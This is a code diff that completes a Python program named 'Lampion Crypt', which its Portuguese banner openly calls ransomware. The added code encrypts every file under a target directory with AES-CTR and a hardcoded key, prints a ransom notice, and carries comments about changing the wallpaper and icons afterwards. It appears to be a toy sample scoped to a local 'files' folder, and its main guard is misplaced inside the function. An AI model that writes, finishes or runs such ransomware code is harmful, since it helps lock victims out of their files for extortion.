@@ -24,7 +24,7 @@ HARDCODED_KEY = 'MARIA BONITA'
 
 
 def get_parser():
-    parser = arg_parser.ArgumentParser(description = "Lampeon")
+    parser = argparse.ArgumentParser(description = "Lampeon")
     parser.add_argument(
         '-d', '--decrypt', help='decripta arquivos [default: no]', action='store_true')
     return parser 
@@ -35,7 +35,7 @@ def main():
     decrypt = args['decrypt']
 
     if decrypt:
-        printf('''
+        print('''
         LAMPION CRYPT : UM RANSOM COM UMA PEXERA NA MÃO!
         ------------------------------------------------
         Seus arquivos foram encryptados.
@@ -47,4 +47,33 @@ def main():
             key = HARDCODED_KEY
 
     ctr = Counter.new(128)
-    crypt = 
+    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
+
+    if not decrypt:
+        cryptFn = crypt.encrypt
+    else:
+        cryptFn = crypt.decrypt
+
+    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
+    startDirs = [init_path]
+
+    for currentDir in startDirs:
+        for filename in Discovery.discover(currentDir):
+            Crypter.change_files(filename, cryptFn)
+
+
+    # Clear crypto key
+
+    for _ in range(100):
+        pass
+    if not decrypt:
+        # ZOEIRA
+        pass 
+
+    # After encryption, you can change the wallpaper
+    # alter icons
+
+
+    if __name__ == '__main__':
+        main() 
+
